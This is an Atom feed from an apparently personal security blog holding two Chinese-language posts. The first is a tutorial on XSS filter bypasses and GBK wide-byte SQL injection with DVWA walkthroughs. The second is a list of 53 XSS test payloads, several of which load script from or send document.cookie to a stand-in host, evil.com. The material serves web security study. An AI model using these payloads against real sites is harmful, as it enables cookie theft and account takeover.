<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guolala&#39;blog</title>
  
  <subtitle>情迷不意乱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-01T13:42:25.456Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>guolala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/11/30/XSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/11/30/XSS绕过及DVWA实例/</id>
    <published>2018-11-30T14:31:11.139Z</published>
    <updated>2018-12-01T13:42:25.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="最基本的用法："><a href="#最基本的用法：" class="headerlink" title="最基本的用法："></a>最基本的用法：</h2><p><code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><p>##大小写及重写的绕过：##</p><p><code>&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt;</code></p><p>##事件绕过：##</p><p><code>利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt;</code></p><p>###相关JS事件：###</p><p><img src="https://i.imgur.com/8cjjBPV.png" alt=""></p><p>##编码绕过：##</p><blockquote><p>当浏览器接受到一份HTML代码后，会对标签之间（<code>&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;</code>除外)、标签的属性中（<code>&lt;a href=&#39;xxxx&#39;&gt;</code>）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在<code>href=&#39;xx&#39;</code>这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段</p></blockquote><p>例如：<br><code>&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></p><blockquote><p>上述代码解析后为：<code>&lt;img src=1 onerror=alert(1)&gt;</code> ,可以弹窗</p></blockquote><p>在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释</p><p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></p><blockquote><p>被url解释器解释完后为<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code>，url中出现了<code>javascript:</code>，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</p></blockquote><p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。<br><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt;</code></p><p>解码后为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,一样可以弹窗。但如果是：<br><code>&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt;</code></p><blockquote><p>解码后为 <code>&lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;</code>就不要指望他可以弹窗了。因为解码出来的<code>&#39;);alert(&#39;111</code>仍为被当作字符串而不会影响上下文。</p></blockquote><h2 id="利用String-fromCharCode进行编码绕过"><a href="#利用String-fromCharCode进行编码绕过" class="headerlink" title="利用String.fromCharCode进行编码绕过"></a>利用String.fromCharCode进行编码绕过</h2><p>测试代码：</p><pre><code>&lt;?phpfunction xss_check($str){    if(preg_match(&apos;/script|alert/i&apos;, $str))        return &apos;error&apos;;    else        return $str;}@$id = $_GET[&apos;id&apos;];echo xss_check($id);?&gt;</code></pre><p>屏蔽了alert(也可能是其他的)，此时可以使用编码绕过：</p><p><code>&lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt;</code></p><blockquote><p>将<code>javascript</code>和<code>alert</code>进行unicode编码实现绕过，成功弹窗。</p></blockquote><p>####利用String.fromCharCode进行编码绕过:####</p><p><code>&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt;</code></p><blockquote><p>其中<code>String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)</code>是<code>alert(/xss/)</code>编码后的内容，google插件hackbar就有此功能。</p></blockquote><p><img src="https://i.imgur.com/vyiYgVR.png" alt=""></p><p>##GBK宽字节绕过##</p><p>测试代码：</p><pre><code>&lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt;&lt;?php error_reporting(0);$conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn);#mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;;if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row);}}else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;;  } ?&gt;</code></pre><p><img src="https://i.imgur.com/0v8MiC1.png" alt=""></p><blockquote><p>直接<strong>‘</strong>会被转义，不会被执行。</p></blockquote><p><img src="https://i.imgur.com/0dSavf0.png" alt=""></p><blockquote><p>使用宽字符就可以被成功执行</p></blockquote><p>###解析过程###</p><ul><li><code>$_GET[‘id’]</code>经过<strong>addslashes</strong>编码之后带入了‘’</li><li>变成 <code>&lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt;</code></li><li>带入mysql处理时使用了gbk字符集</li><li><strong>%df%5c</strong> 運成功的吃掉了<strong>%5c</strong></li><li><strong>%27‘</strong>单引号成功闭合</li><li>GBK编码，编码范围是<strong>0x8140~0xFEFE</strong>（不包括xx7F），在遇到<strong>%df(ascii(223)) &gt;ascii(128)</strong>时自动拼接<strong>%5c，</strong>因此吃掉<strong>‘</strong>，而<strong>%27</strong>、<strong>%20</strong>小于<strong>ascii(128)</strong>的字符就保留了。</li></ul><p>##IE6下绕过##</p><p>IE下还可利用javascript:alert(/xss/); 或css</p><pre><code>body {background:black;xss:expression(alert(/zhuling.wang/));/*IE6下测试*/}</code></pre><blockquote><p>成功绕过</p></blockquote><p>##DVWA测试用例##</p><p>###反射性XSS###</p><p>####低等级####</p><p>任意XSS都可用</p><p>####中等级####</p><pre><code>&lt;script  &gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;img src=# onerror=alert(1)&gt;&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等</code></pre><p>####高等级####<br>过滤掉script标签更严格，不能使用script标签</p><pre><code>&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;&lt;img src=# onerror=alert(1)&gt;</code></pre><p>其他html标签构造的事件还是可以使用的。</p><p>####不可能级别####<br>用到了<code>htmlspecialchars()</code>，这个函数是将预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li><blockquote><p>（大于）成为 &gt;</p></blockquote></li></ul><p>###存储型XSS###</p><p>####低等级####</p><p>没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。</p><p><code>&lt;img src=# onerror=alert(1)&gt;等等</code></p><p>####中等级####</p><p>因为一上来就给Message添加了<code>htmlspecialchars</code>函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。<br>或者可以用<strong>burp</strong>抓包发送。</p><p>####高等级####</p><p>message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。</p><p><img src="https://i.imgur.com/85bxZJs.png" alt=""></p><p>####不可能级别####<br>这里对name和message都做了htmlspecialchars（）处理。</p><p>###DOM型XSS###</p><p>####低等级####</p><p>直接在网页导航栏构造GET XSS即可完成注入</p><p>####中等级####</p><p>源码显示会过滤掉script标签，但是直接用<code>&lt;img src=# onerror=alert(1)&gt;</code>没有直接执行，尝试闭合<strong>option</strong>没有成功,尝试闭合select标签成功执行。<br><img src="https://i.imgur.com/x7PaOkG.png" alt=""></p><blockquote><p><code>?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>也可以。</p></blockquote><p>####高等级####</p><p>对传入值进行switch判断</p><p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p><blockquote><p><strong>#</strong>该字符后的数据不会发送到服务器端，从而绕过服务端过滤。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;最基本的用法：&quot;&gt;&lt;a href=&quot;#最基本的用法：&quot; class=&quot;headerlink&quot; title=&quot;最基本的用法：&quot;&gt;&lt;/a&gt;最基本的用法：&lt;/h2&gt;&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/scri
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/11/30/XSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/11/30/XSS测试用例/</id>
    <published>2018-11-30T05:56:25.319Z</published>
    <updated>2018-12-01T13:28:00.318Z</updated>
    
    <content type="html"><![CDATA[<p>1.<code>&lt;script&gt; alert(1);&lt;/script&gt;</code></p><p>2.<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><p>3.<code>&lt;script  src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt;</code></p><p>4.<code>&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt;</code></p><p>5.<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;</code></p><p>6.<code>&lt;img src=liu.jpg onerror=alert(/xss/)/&gt;</code></p><p>7.<code>&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt;</code></p><p>8.<code>&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt;</code></p><p>9.<code>&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt;</code></p><p>10.<code>&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt;</code></p><p>11.<code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p><p>12.<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>13.<code>&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt;</code></p><p>14.<code>&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>15.<code>&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt;</code></p><p>16.<code>&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>17.<code>&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>18.<code>&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt;</code></p><p>19.<code>&#39;);alert(&#39;XSS</code></p><p>20.<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></p><p>21.<code>[url=javascript:alert(&#39;XSS&#39;);]click me[/url]</code></p><p>22.<code>&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>23.<code>&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot;</code></p><p>24.<code>[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color]</code></p><p>25.<code>&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;</code></p><p>26.<code>window.alert(&quot;XSS&quot;);</code></p><p>27.<code>&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt;</code></p><p>28.<code>&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt;</code></p><p>29.<code>&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code><br>30.<code>&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt;</code></p><p>31.<code>&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>32.<code>&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;</code></p><p>33.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>34.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>35.<code>&lt;script&gt;var var=1; alert(var)&lt;/script&gt;</code></p><p>36.<code>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;</code></p><p>37.<code>&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt;</code></p><p>38.<code>&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>39.<code>&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot;</code></p><p>40.<code>&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt;</code></p><p>41.<code>&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></p><p>42.<code>&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt;</code></p><p>43.<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></p><p>44.<code>&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</code></p><p>45.<code>[color=red width=expression(alert(123))][color]</code></p><p>46.<code>&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;</code></p><p>47.<code>Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt;</code></p><p>48.<code>&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code></p><p>49.<code>&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>50.<code>&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt;</code></p><p>51.<code>&lt;div style=&quot;background:url(&#39;javascript:&#39;)</code></p><p>52.<code>&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>53.<code>&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.&lt;code&gt;&amp;lt;script&amp;gt; alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.
      
    
    </summary>
    
    
  </entry>
  
</feed>
